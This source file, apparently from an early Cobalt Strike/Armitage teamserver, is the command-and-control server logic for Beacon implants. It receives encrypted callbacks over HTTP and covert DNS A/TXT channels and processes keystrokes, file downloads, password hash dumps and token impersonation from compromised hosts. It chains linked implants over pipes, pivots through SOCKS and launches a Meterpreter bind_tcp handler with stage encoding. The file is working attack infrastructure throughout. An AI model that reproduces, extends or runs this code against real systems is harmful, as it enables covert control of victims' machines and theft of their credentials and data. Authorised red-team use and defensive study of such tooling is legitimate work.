#
# C2 related functions for Beacon
#

import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;
import console.*;
import armitage.*;

import cloudstrike.*;

# called when an HTTP POST request comes in (without output from a request)
sub process_beacon_post {
	local('$data $parms $id $headers $ext $user $handle $type $nlen $name $dlen $beacon $host $handle $len $x $next');
	$parms = convertAll($4);
	$headers = convertAll($3);
	$id = $parms['id'];
	$ext = substr($headers['REMOTE_ADDRESS'], 1);

	$handle = [SleepUtils getIOHandle: $parms['input'], $null];
	$data   = readb($handle, -1);
	closef($handle);

	$id   = [$c2profile recover: ".http-post.client.id", $headers, $parms, $data, "$1"];
	$data = [$c2profile recover: ".http-post.client.output", $headers, $parms, $data, "$1"];

	process_beacon_data($id, $data);
	return "";
}

sub process_beacon_data {
	local('$data $len $next $id');
	($id, $data) = @_;

	while ($data ne "") {
		$len  = unpack("I", substr($data, 0, 4))[0];
		if ($len > (strlen("$data") + 4)) {
			print_error("$len + 4 exceeded length of data: " . strlen($data));
			return;
		}
		$next = substr($data, 4, $len + 4);
		process_beacon_callback($id, $next);
		$data = substr($data, $len + 4);
	}	
}

# kill all pipes please
sub api_beacon_unlink {
	local('$id $target $beacon %hosts $pid $pipes $chid $i $h');
	($id, $target) = $2;

	# find our host information
	foreach $beacon (call($mclient, "beacon.list")) {
		($i, $h) = values($beacon, @('id', 'internal'));
		%hosts[$i] = $h;
	}

	# look at all pipes that are connected to me.
	foreach $pid => $pipes (%pipes) {
		# I *am* connected to $pid
		if ($id in $pipes && %hosts[$pid] eq $target) {
			call_async($mclient, "beacon.task", $pid, pack("III", 0x17, 4, $id));
		}
	}

	# look at all things connected to me.
	if ($id in %pipes && -ishash %pipes[$id]) {
		foreach $chid (%pipes[$id]) {
			if (%hosts[$chid] eq $target) {
				call_async($mclient, "beacon.task", $id, pack("III", 0x17, 4, $chid));
			}
		}
	}

	return %();
}

# cleanup Beacon in this context (%socks and %pipes)
sub api_beacon_remove2 {
	local('$id $pid $pipes');
	($id) = $2;

	# who am I linked to? no idea
	%pipes[$id] = $null;

	# if anyone thinks they're lnked to this beacon... undo that too
	foreach $pid => $pipes (%pipes) {
		$pipes[$id] = $null;
	}

	# allow host to get re-added if beacon shows up later
	%seen[$id] = $null;

	return %();
}

# recursively process through pipes... marking children as dead
# dead_pipe(parent, child)
sub dead_pipe {
	local('$pid $chid $phost $chost $beacon @pipes %hosts $pipe');
	($pid, $chid, %hosts) = @_;

	# map out our host info
	$phost = %hosts[$pid];
	$chost = %hosts[$chid];

	# update the checkin time for this beacon
	call_async($mclient, "beacon.register", $chid, %(last => ticks(), id => $chid, external => "$phost \u26AF \u26AF"));

	# close the pipe
	%pipes[$pid][$chid] = $null;

	# announce it
	call_async($mclient, "beacon.log_write", $pid, "[-] lost link to child beacon: $chost $+ \n");
	call_async($mclient, "beacon.log_write", $chid, "[-] lost link to parent beacon: $phost $+ \n");

	# remove the chid's pipes. Do it now so we don't end up in an infinite loop
	if ($chid in %pipes && -ishash %pipes[$chid]) {
		@pipes = keys(%pipes[$chid]);
		%pipes[$chid] = $null;

		# delink these other beacons too
		foreach $pipe (@pipes) {
			dead_pipe($chid, $pipe, %hosts);
		}
	}
}

# process any Beacon output (no matter how it got to us)
sub process_beacon_callback {
	global('%downloads %fnames');
	local('$type $data $nlen $name $dlen $beacon $host $handle $id $s');

	# ok, now... let's extract the data
	$data = [$security decrypt: $1, cast($2, 'b')];
	if ($data eq "") {
		print_error("Decrypt on beacon $1 POST failed (did you start CS from a different folder?)");
		return;
	}

	# extract the type AND data from this package...
	$type = unpack("I", substr($data, 0, 4))[0];
	$data = substr($data, 4);

	# received output
	if ($type == 0) {
		call_async($mclient, "beacon.log_write", $1, "[+] received output: \n $+ $data $+ \n");
	}
	# received keystrokes
	else if ($type == 1) {
		call_async($mclient, "beacon.log_write", $1, "[+] received keystrokes: \n $+ $data $+ \n");
	}
	# file metadata
	else if ($type == 2) {
		local('$fid $flen $name');
		($fid, $flen) = unpack("II", substr($data, 0, 8));

		# file name is 8 bytes and beyond...
		$name = substr($data, 8);

		# find our host...
		foreach $beacon (call($mclient, "beacon.list")) {
			if ($beacon['id'] eq $1) {
				$host = $beacon['internal'];
			}
		}

		# announce the file...
		call_async($mclient, "beacon.log_write", $1, "[*] started download of $name ( $+ $flen bytes)\n");

		# save our file...
		$name = strrep($name, '\\', '/', '..', '');
		mkdir(getFileParent(getFileProper($downloaddir, $host, $name)));

		# open our file for writing
		$handle = openf(">" . getFileProper($downloaddir, $host, $name));

		# store this information for later
		%fnames[$1][$fid] = $name;
		%downloads["$1 $fid"] = $handle;
	} 
	# screenshot data
	else if ($type == 3) {
		# reserved for screenshot command (later?)
	}
	# socket closed
	else if ($type == 4) {
		# read data, write it to the write SOCKS client
		$id   = unpack("I", substr($data, 0, 4))[0];
		#call_async($mclient, "beacon.log_write", $1, "[-] socket $id closed. Boo!\n");
		$s = %socks[$1];
		if ($s !is $null) {
			[$s die: $id];
		}
	}
	# read data from socket
	else if ($type == 5) {
		# read data, write it to the write SOCKS client
		$id   = unpack("I", substr($data, 0, 4))[0];
		$data = substr($data, 4);
		#call_async($mclient, "beacon.log_write", $1, "[*] read data from $id (" . strlen($data) . " bytes)\n");
		$s = %socks[$1];
		if ($s !is $null) {
			[$s write: $id, cast($data, 'b'), 0, strlen($data)];
		}
	}
	# successful connection, respond appropriately
	else if ($type == 6) {
		# tell the SOCKS server to resume the connection
		$id   = unpack("I", substr($data, 0, 4))[0];
		#call_async($mclient, "beacon.log_write", $1, "[+] connect from $id $+ \n");
		$s = %socks[$1];
		if ($s !is $null) {
			[$s resume: $id];
		}
	}
	# inject with callback... that's useful.
	else if ($type == 7) {
		local('$port $beacon $proxy $host');
		$port  = unpack("S", substr($data, 0, 2))[0];
		$proxy = randomPort();

		# find our host...
		foreach $beacon (call($mclient, "beacon.list")) {
			if ($beacon['id'] eq $1) {
				$host = $beacon['internal'];
			}
		}

		# complain if we could not find host information!
		if ($host is $null) {
			call_async($mclient, "beacon.log_write", $1, "[-] Beacon recently synced. Try 'meterpreter' command again.\n");
			return;
		}

		# stand up our port forward...
		call_async($mclient, "beacon.pivot_once", $1, $proxy);
	
		# tell the user what's happening
		call_async($mclient, "beacon.log_write", $1, "[*] connecting to bind listener on $port via socks $proxy $+ \n");

		fork({
			sleep(7500);
			# use EXITFUNC => "process" because we're always injecting into a new process.
			call_async($mclient, "module.execute", "exploit", "multi/handler", %(PAYLOAD => "windows/meterpreter/bind_tcp", RHOST => $host, LPORT => $port, Proxies => "socks4:127.0.0.1: $+ $proxy", EnableStageEncoding => "true", StageEncoder => "x86/call4_dword_xor", EXITFUNC => "process"));
		}, \$port, \$proxy, \$mclient, \$host);
	}
	# partial file download... write out the content...
	else if ($type == 8) {
		local('$fid $dlen $fname');
		($fid) = unpack("I", substr($data, 0, 4));
		$data = substr($data, 4);
		if ("$1 $fid" in %downloads) {		
			$dlen = strlen($data);
			$fname = %fnames[$1][$fid];
			call_async($mclient, "beacon.log_write", $1, "[*] received $dlen bytes of $fname $+ \n");
			writeb(%downloads["$1 $fid"], $data);
		}
		else {
			print_error("Received unknown download id $fid - canceling download");
			# send a message telling Beacon to cancel the download...
			call_async($mclient, "beacon.task", $1, pack("III", 0x13, 4, $fid));
		}
	}
	# file download is complete... whirred
	else if ($type == 9) {
		local('$fid $fname');
		($fid) = unpack("I", substr($data, 0, 4));
		if ("$1 $fid" in %downloads) {
			# close the download file handle
			closef(%downloads["$1 $fid"]);

			# get the filename
			$fname = %fnames[$1][$fid];

			# cleanup unneeded values
			%downloads["$1 $fid"] = $null;
			%fnames[$1][$fid] = $null;

			# let the user know what happened
			call_async($mclient, "beacon.log_write", $1, "[*] download of $fname is complete\n");
		}
	}
	# pipe open
	else if ($type == 0x0a) {
		local('$aid $beacon $phost $chost $meta');
		($aid) = unpack("I", substr($data, 0, 4));

		# process metadata about the host please
		process_beacon_metadata($null, substr($data, 4));

		# find our host...
		foreach $beacon (call($mclient, "beacon.list")) {
			if ($beacon['id'] eq $1) {
				$phost = $beacon['internal'];
			}
			else if ($beacon['id'] eq $aid) {
				$chost = $beacon['internal'];
			}
		}

		# update the checkin time for this beacon
		call_async($mclient, "beacon.register", $aid, %(last => ticks(), id => $aid, external => "$phost \u26AF\u26AF"));

		# open the pipe
		%pipes[$1][$aid] = 1;

		# announce it...
		if ($chost is $null) {
			call_async($mclient, "beacon.log_write", $1, "[+] established link to child beacon\n");
		}
		else {
			call_async($mclient, "beacon.log_write", $1, "[+] established link to child beacon: $chost $+ \n");
		}
		call_async($mclient, "beacon.log_write", $aid, "[+] established linked to parent beacon: $phost $+ \n");
	}
	# pipe close
	else if ($type == 0x0b) {
		local('$aid $beacon $i $h %hosts');
		($aid) = unpack("I", substr($data, 0, 4));

		# find our host information
		foreach $beacon (call($mclient, "beacon.list")) {
			($i, $h) = values($beacon, @('id', 'internal'));
			%hosts[$i] = $h;
		}

		# recurse through our pipes and clean up this mess...
		dead_pipe($1, $aid, %hosts);
	}
	# pipe read
	else if ($type == 0x0c) {
		local('$aid');
		($aid) = unpack("I", substr($data, 0, 4));

		# if there's data... process it.
		if (strlen($data) > 4) {
			$data = substr($data, 4);
			process_beacon_data($aid, $data);
		}

		# update the checkin time for this beacon
		call_async($mclient, "beacon.register", $aid, %(last => ticks(), id => $aid));
	}
	# error callback
	else if ($type == 0x0d) {
		call_async($mclient, "beacon.log_write", $1, "[-] $data $+ \n");
	}
	# pipe ping
	else if ($type == 0x0e) {
		local('$aid');
		($aid) = unpack("I", substr($data, 0, 4));

		# check if this is a re-connect... if so, ask for metadata...
		if ($1 !in %pipes || $aid !in %pipes[$1]) {
			# ask pipe to resend metadata please
			call_async($mclient, "beacon.task", $1, pack("III", 0x18, 4, $aid));
			%pipes[$1][$aid] = 1;
		}

		# don't update the checkin time... we don't have one :)
		call_async($mclient, "beacon.register", $aid, %(id => $aid));
	}
	# Token Impersonated
	else if ($type == 0x0f) {
		call_async($mclient, "beacon.log_write", $1, "[+] Impersonated $data $+ \n");
	}
	# GETUID output
	else if ($type == 0x10) {
		call_async($mclient, "beacon.log_write", $1, "[*] You are $data $+ \n");
	}
	# PS output
	else if ($type == 0x11) {
		local('$out $temp $pid $ppid $name $arch $session $user @ps $k');
		$out = allocate();
		println($out, "[*] Process List\n");
		println($out, " PID   PPID  Name                         Arch  Session     User");
		println($out, " ---   ----  ----                         ----  -------     -----");

		# format each entry...
		foreach $temp (split("\n", ["$data" trim])) {
			($name, $ppid, $pid, $arch, $user, $session) = split("\t", $temp);
			push(@ps, %(pid => $pid, entry => " $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user"));
		}

		# sort them into a senseible order
		sort({ return $1['pid'] <=> $2['pid']; }, @ps);

		# print them...
		foreach $k => $temp (@ps) {
			println($out, $temp['entry']);
		}

		println($out);
		closef($out);

		call_async($mclient, "beacon.log_write", $1, readb($out, -1));
		closef($out);
	}
	# replay trigger detected...
	else if ($type == 0x12) {
		local('$diff');
		($diff) = unpack("I", substr($data, 0, 4));
		call_async($mclient, "beacon.log_write", $1, "[-] Task Rejected! Did your clock change? Wait\cF $diff \oseconds\n");
	}
	else if ($type == 0x13) {
		call_async($mclient, "beacon.log_write", $1, "[*] Current directory is $data $+ \n");
	}
	# jobs...
	else if ($type == 0x14) {
		local('$out $temp $jid $pid $desc');
		$out .= "[*] Jobs\n\n";
		$out .= " JID  PID   Description\n";
		$out .= " ---  ---   -----------\n";

		foreach $temp (split("\n", ["$data" trim])) {
			($jid, $pid, $desc) = split("\t", $temp);
			$out .= " $[4]jid $[5]pid $desc $+ \n";
		}

		call_async($mclient, "beacon.log_write", $1, $out);
	}
	# hashdump
	else if ($type == 0x15) {
		call_async($mclient, "beacon.log_write", $1, "[+] dumped password hashes: \n $+ $data $+ \n");
	}
	else {
		print_error("Unknown Beacon Callback: $type");
	}
}

sub process_beacon_metadata {
	local('$id $pid $ver $int $computer $user $flavor $ver $data $is64 $aeskey');

	# decrypt the data plz
	$data = [$asecurity decrypt: cast($2, 'b')];
	if ($data eq "") {
		print_error("decrypt of metadata failed\n");
		return;
	}

	# pull our AES key from metadata
	$aeskey = substr($data, 0, 16);

	# ok, now extract metadata
	($id, $pid, $ver, $int, $computer, $user, $is64) = split("\t", substr($data, 16));

	# register our AES key
	[$security registerKey: $id, cast($aeskey, 'b')];

	call_async($mclient, "beacon.register", $id, %(external => $null, internal => $int, host => $int, user => $user, computer => $computer, last => ticks(), id => $id, pid => $pid, is64 => $is64));

	# do some first time info stuff...
	if ($id !in %seen) {
		%seen[$id] = 1;
		beacon_report_host($id, "unknown", $int, $user, $computer, $ver);
	}
}

# beacon_report_host(id, external, internal, user, computer)
# log host metadata... 
sub beacon_report_host {
	local('$id $ext $int $user $computer $ver $addr');
	($id, $ext, $int, $user, $computer, $ver) = @_;

	$addr = iff($ext eq "unknown", $int, $ext);

	if (function('&event')) {
		event("[*] initial beacon from $user $+ @ $+ $addr ( $+ $computer $+ )\n");
	}

	call_async($client, "db.log_event", "$int $+ //beacon", "initial beacon from $user $+ @ $+ $addr ( $+ $computer $+ )");

	# which OS are we? (loose grab... we're aiming to make the icon correct)
	local('$flavor');
	if ($ver == 6.0) {
		$flavor = "Vista";
	}
	else if ($ver >= 6.2) {
		$flavor = "8";
	}
	else if ($ver == 6.1) {
		$flavor = "7";
	}
	else if ($ver < 5.1) {
		$flavor = "2000";
	}
	else {
		$flavor = "XP";
	}

	# add our hosts if we need to...
	if ($int ne "unknown" && $ext eq "unknown") {
		cmd_safe("hosts -a $int", lambda({
			call_async($mclient, "db.report_host", %(host => $int, os_name => "Microsoft Windows", os_flavor => $flavor));
		}, \$int, \$flavor));
	}
	else if ($int eq "unknown" || $ext eq $int) {
		cmd_safe("hosts -a $ext", lambda({
			call_async($mclient, "db.report_host", %(host => $ext, os_name => "Microsoft Windows", os_flavor => $flavor));
		}, \$ext, \$int, \$flavor));
	}
	else {
		cmd_safe("hosts -a $ext $int", lambda({
			call_async($mclient, "db.report_host", %(host => $ext, purpose => "firewall"));
			call_async($mclient, "db.report_host", %(host => $int, os_name => "Microsoft Windows", os_flavor => $flavor));
		}, \$ext, \$int, \$flavor));
	}
}

sub isBeaconDownloadInProgress {
	return iff($1 in %fnames && size(%fnames[$1]) > 0);
}

sub beacon_data_package {
	local('$data $id $max $a $b $handle $total $pid $signal');
	($id, $max) = @_;

	$handle = allocate($max);

	# grab my data
	$a = call($mclient, "beacon.dump", $id);
	$total += strlen($a);
	$signal = $total;     # we want this to be the indicator the host called home message drives off of

	# grab my socket data too...
	if ($id in %socks) {
		$b = [%socks[$id] grab: $max - $total];
		$total += strlen($b);

		if (strlen($b) > 0) {
			writeb($handle, $b);
		}
	}

	# ok, write our first batch of data out... (we want the socket to come first)
	if (strlen($a) > 0) {
		writeb($handle, $a);
	}

	# grab data from our pipes
	if ($id in %pipes) {
		foreach $pid (keys(%pipes[$id])) {
			if ($total < $max && [$security isReady: $pid]) {
				($data, $null) = beacon_data_package($pid, $max - $total);
				if (strlen($data) > 0) {
					$data = [$security encrypt: $pid, cast($data, 'b')];
					bwrite($handle, 'III', 0x16, strlen($data) + 4, $pid); 
					writeb($handle, $data);
				}
				else if ($pid in %socks || isBeaconDownloadInProgress($pid)) {
					# always call home if there's a socket open
					bwrite($handle, 'III', 0x16, 4, $pid);
				}
				$total += strlen($data) + 4;
			}
		}
	}

	# now we can deconstruct our buffer..
	closef($handle);
	$data = readb($handle, -1);

	# free resources associated with buffer...
	closef($handle);

	return @($data, $signal);
}

# called when an HTTP GET request occurs
sub process_beacon {
	local('$data $parms $id $headers $ext $user $pid $session $computer $r $ver $int $is64 $signal $aeskey');
	$parms = convertAll($4);
	$headers = convertAll($3);

	$session = [$c2profile recover: ".http-get.client.metadata", $headers, $parms, "", "$1"];
	if (strlen($session) == 0) {
		print_error("Invalid session id: $session");
		return "";
	}

	$r = [$asecurity decrypt: cast($session, 'b')];
	if ($r eq "") {
		print_error("Could not decrypt session metadata\n");
		return "";
	}

	# pull our AES key from metadata
	$aeskey = substr($r, 0, 16);

	# ok, now extract metadata
	($id, $pid, $ver, $int, $computer, $user, $is64) = split("\t", substr($r, 16));
	$ext = substr($headers['REMOTE_ADDRESS'], 1);

	# register our AES key
	[$security registerKey: $id, cast($aeskey, 'b')];

	($data, $signal) = beacon_data_package($id, 921600);

	call_async($mclient, "beacon.register", $id, %(external => $ext, internal => $int, host => iff($int eq "" || $int eq "unknown", $ext, $int), user => $user, computer => $computer, last => ticks(), id => $id, pid => $pid, is64 => $is64));
	if (strlen($data) > 0) {
		if ($signal > 0) {
			call_async($mclient, "beacon.log_write", $id, "[+] host called home, sent: " . strlen($data) . " bytes\n");
		}

		# encrypt the data...
		$data = [$security encrypt: $id, cast($data, 'b')];
	}

	# do some first time info stuff...
	if ($id !in %seen || %seen[$id] == 1) {
		%seen[$id] = 2;
		beacon_report_host($id, $ext, $int, $user, $computer, $ver);
	}

	return $data . "";
}

# function to send data via DNS C2
sub beacon_dns_sequence {
	local('$x $start');
	$start = ticks();

	# send the user the length of the data.
	yield dns_a(strlen($data));

	# transmit all of the data to the user...
	for ($x = 0; $x < strlen($data); $x += 4) {
		if (($x + 4) >= strlen($data)) {
			$start = ticks() - $start;
			%conversations[$id] = $null;
			if ($signal > 0) {
				call_async($mclient, "beacon.log_write", $id, "[*] sent " . strlen($data) . " bytes via dns ( $+ $start ms)\n");
			}
		}

		yield dns_a(unpack("I+", substr($data, $x, $x + 4))[0]);
	}

	# we never get here... don't put code here.
	return dns_a(0);
}

# function to send data via DNS C2
sub beacon_dns_sequence_txt {
	local('$x $start');
	$start = ticks();

	# send the user the length of the data. (A record)
	yield dns_a(strlen($data));

	# base64 encode our data 
	$data = [msf.Base64 encode: cast($data, 'b')];

	# transmit all of the data to the user...
	for ($x = 0; $x < strlen($data); $x += 252) {
		if (($x + 252) >= strlen($data)) {
			$start = ticks() - $start;
			%conversations[$id] = $null;
			if ($signal > 0) {
				call_async($mclient, "beacon.log_write", $id, "[*] sent " . strlen($data) . " characters via dns txt ( $+ $start ms)\n");
			}
			return dns_txt(substr($data, $x));
		}
		else {
			yield dns_txt(substr($data, $x, $x + 252));
		}
	}

	# we never get here... don't put code here.
	return dns_a(0);
}

# function to send data via DNS C2
sub beacon_dns_stage_sequence {
	local('$x');

	# transmit all of the data to the user...
	for ($x = 0; $x < strlen($data); $x += 255) {
		yield dns_txt(substr($data, $x, $x + 255));
	}

	return dns_txt("");
}

# function to receive data via DNS C2
sub beacon_dns_sequence_recv {
	local('$x $size $data');

	# what is the size of our data?
	$size = long(parseNumber($1, '16'));

	# sanity check... somehow something is being interpreted out of sequence
	if ($size <= 0) {
		print_error("$size <= 0 - $type $id $finish (beaconc2.sl)"); 
		return dns_a(rand(0x6FFFFFFFL) + 1);
	}

	# transmit all of the data to the user...
	for ($x = 0; $x < $size; $x = strlen($data)) {
		# return a value or watch the cache mechanism break!
		yield dns_a(rand(0x6FFFFFFFL) + 1);
		$data .= pack("H", $1);
	}

	# clear this conversation please
	%conversations[$id][$type] = $null;

	# report everything...
	[$finish: $id, $data];

	# do return a value so the cache doesn't break
	return dns_a(rand(0x6FFFFFFFL) + 1);
}

sub dns_a {
	return [dns.DNSServer A: $1];
}

sub dns_txt {
	return [dns.DNSServer TXT: cast($1, 'b')];
}

inline check_dns_cache {
	if ($id in %checks && "$nonce" in %checks[$id]) {
		return %checks[$id]["$nonce"];
	}
	else if (!-isnumber $id) {
		print_info("DNS: ignoring $1");
		return dns_a(0);
	}
}

# process any incoming DNS request and work it as needed
sub api_check_beacon {
	# %checks = a var to track unique DNS requests and cache their result. We do this because some
	#           servers will make multiple requests on behalf of their clients
	# %conversations = a unique Sleep function for each agent id/transaction... I use this to keep
	#           track of the state of the conversation on a client-by-client basis

	# process the beacons we have coming in...
	local('$id $data $nonce $id $f $r $a $b $type $handle $signal');

	$1 = lc($1); # need to be case agnostic
	($id) = split('\\.', $1);

	# stage a payload using TXT records
	if ("*.stage.*" iswm $1 && strlen($id) == 3) {
		$type = "stage";
		$id   = lc($id); # dns isn't case sensitive and it's important we transmit the sequence correctly

		# check our cache... and make sure the query is valid
		if ("stage" in %checks && "$id" in %checks[$type]) {
			return %checks["stage"]["$id"];
		}

		# if this is a new conversation, that's fine... be sure to set it up
		if (%conversations["stage"] is $null) {
			# create a conversation for it
			%conversations["stage"] = lambda(&beacon_dns_stage_sequence, $data => $stage);
		}

		# execute our conversation
		$f = %conversations["stage"];
		$r = [$f];

		# cache the result.
		%checks["stage"]["$id"] = $r;
		return $r;
	}
	# transmit data using A (cdn.*) or TXT (api.*) records
	else if ($id eq "cdn" || $id eq "api") {
		($type, $nonce, $id) = split('\\.', $1);

		check_dns_cache();

		# if this is a new conversation, that's fine... be sure to set it up
		if (%conversations[$id][$type] is $null) {
			# grab what we're going to send...
			($data, $signal) = beacon_data_package($id, 72000);
		
			# if we have something to send... do it
			if (strlen($data) > 0) {
				$data = [$security encrypt: $id, cast($data, 'b')];
				if ($signal > 0) {
					call_async($mclient, "beacon.log_write", $id, "[+] host called home, sending: " . strlen($data) . " bytes via dns\n");
				}
			}
			else {
				%checks[$id]["$nonce"] = dns_a(0);
				return dns_a(0);
			}

			if ($type eq "api") {
				%conversations[$id][$type] = lambda(&beacon_dns_sequence_txt, \$type, \$data, \$id, \$signal);
			}
			else {
				%conversations[$id][$type] = lambda(&beacon_dns_sequence, \$type, \$data, \$id, \$signal);
			}
		}

		# execute our conversation
		$f = %conversations[$id][$type];
		$r = [$f];

		# cache the result.
		%checks[$id]["$nonce"] = $r;
		return $r;
	}
	# receive metadata or output using A records (data is in the hostname itself)
	else if ($id eq "www" || $id eq "post") {
		# extract our data please!
		local('$a $b $c');
		($type, $data) = split('\\.', $1);
		$c = substr($data, 0, 1);
		if ($c == 1) {
			($type, $a, $nonce, $id) = split('\\.', $1);
			$data = substr($a, 1);
		}
		else if ($c == 2) {
			($type, $a, $b, $nonce, $id) = split('\\.', $1);
			$data = substr($a, 1) . $b;
		}
		else if ($c == 3) {
			($type, $a, $b, $c, $nonce, $id) = split('\\.', $1);
			$data = substr($a, 1) . $b . $c;
		}

		# now, check the cache
		check_dns_cache();

		# if this is a new conversation, that's fine... be sure to set it up
		if (%conversations[$id][$type] is $null) {
			if ($type eq "www") {
				%conversations[$id][$type] = lambda(&beacon_dns_sequence_recv, \$type, \$id, $finish => lambda(&process_beacon_metadata, \$id));
			}
			else if ($type eq "post") {
				%conversations[$id][$type] = lambda(&beacon_dns_sequence_recv, \$type, \$id, $finish => lambda(&process_beacon_callback, \$id));
			}
		}

		# execute our conversation
		$f = %conversations[$id][$type];
		$r = [$f: $data];

		# cache the result.
		%checks[$id]["$nonce"] = $r;
		return $r;
	}
	# a ping from our DNS Beacon
	else if (-isnumber $id) {
		# every 15 transactions... clear the cache for a beacon
		if ($id in %checks && '__MAX__' in %checks[$id] && %checks[$id]['__MAX__'] >= 15) {
			#warn("Clearing $id => " . size(%checks[$id]) . " entries");
			%checks[$id] = $null;
		}
		else {
			# purge cache every few transactions
			%checks[$id]['__MAX__'] += 1;
		}
		%conversations[$id] = $null;

		# when SOCKS is on, Beacon should *always* checkin, no matter what
		$data = call($mclient, "beacon.check", $id, iff($id in %socks || size(%pipes[$id]) > 0));
		call_async($mclient, "beacon.register", $id, %(last => ticks(), id => $id));
		return dns_a($data);
	}
	# I have no idea what this is... not very useful
	else {
		# we don't recognize this request.
		print_info("DNS: ignoring $1");
		return dns_a(0);
	}
}

# stops Beacon
sub api_stop_beacon {
	local('$port $www $server $migrate $wantdns $s');
	($port) = $2;
	if ($port in %servers) {
		$server = %servers[$port];
		[$server deregister: "beacon.http-get"];
		[$server deregister: "beacon.http-post"];
		$s = [$server deregister: "stager"];
		if ($s) {
			%servers[$port] = $null;
		}
	}
}

